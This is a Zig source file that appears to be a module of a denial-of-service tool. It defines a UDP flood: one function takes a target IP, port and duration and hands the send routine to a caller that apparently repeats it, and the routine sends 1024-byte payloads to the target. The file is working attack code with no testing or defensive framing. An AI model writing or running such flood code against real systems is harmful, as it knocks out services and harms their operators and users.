const std = @import("std");

const linux = std.os.linux;

const helpers = @import("../helpers.zig");
const Caller = @import("Caller.zig");

const assemble = @import("headers/assemble.zig");

pub fn udp(allocator: std.mem.Allocator, dst_ip: [4]u8, port: u16, duration: u32) void {
    const c = Caller.init(allocator, 5, duration, @constCast(&_udp), .{ .ip = dst_ip, .port = port });
    c.call();
}

pub fn _udp(dst_ip: [4]u8, port: u16) void {
    const fd = linux.socket(linux.AF.INET, linux.SOCK.DGRAM, linux.IPPROTO.UDP);
    defer _ = linux.close(@intCast(fd));

    const sockaddr = std.net.Address{ .in = std.net.Ip4Address.init(dst_ip, port) };

    const payload = assemble.payload(1024);

    _ = helpers.sendto(@intCast(fd), payload.ptr, payload.len, linux.MSG.NOSIGNAL, &sockaddr.any, @intCast(@as(linux.socklen_t, sockaddr.getOsSockLen()))) catch |err| {
        std.debug.print("err {s}", .{@errorName(err)});
        return;
    };
}
